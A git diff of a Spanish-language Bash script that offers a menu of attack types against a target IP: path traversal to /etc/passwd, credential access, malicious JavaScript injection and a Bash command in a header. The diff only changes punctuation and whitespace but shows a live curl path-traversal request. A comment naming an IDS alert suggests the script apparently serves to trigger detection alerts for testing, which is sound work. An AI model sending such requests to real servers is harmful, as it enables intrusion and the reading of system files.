@@ -71,12 +71,12 @@ vIP="$1"
     fi
   menu=(dialog --checklist "Que tipo de ataque deseas ejecutar (marca con espacio y presiona Enter):" 22 80 16)
     opciones=(
-      1 "Escalar hasta el archivo /etc/passwd del servidor"          off
-      2 "Acceder a las credenciales de autenticación de una carpeta" off
-      3 "Inyectar código Javascript malicioso"                       off
-      4 "Acceder al archivo passwd del servidor usando PHP"          off
-      5 "Ejecutar un comando de Bash en la cabecera TCP"             off
-      6 "Odio a Iñigo 24"                                            off
+      1 "Escalar hasta el archivo /etc/passwd del servidor."          off
+      2 "Acceder a las credenciales de autenticación de una carpeta." off
+      3 "Inyectar código Javascript malicioso."                       off
+      4 "Acceder al archivo passwd del servidor usando PHP."          off
+      5 "Ejecutar un comando de Bash en la cabecera TCP."             off
+      6 "Odio a Iñigo 24."                                            off
     )
   choices=$("${menu[@]}" "${opciones[@]}" 2>&1 >/dev/tty)
   clear
@@ -90,7 +90,7 @@ vIP="$1"
             echo "  Intentando escalar hasta el archivo /etc/passwd del servidor..."
             echo ""
             # Alerta: Web.Server.Password.File.Access
-               curl -X GET "http://"$vIP":80/../../etc/passwd"
+              curl -X GET "http://"$vIP":80/../../etc/passwd"
   
           ;;
 
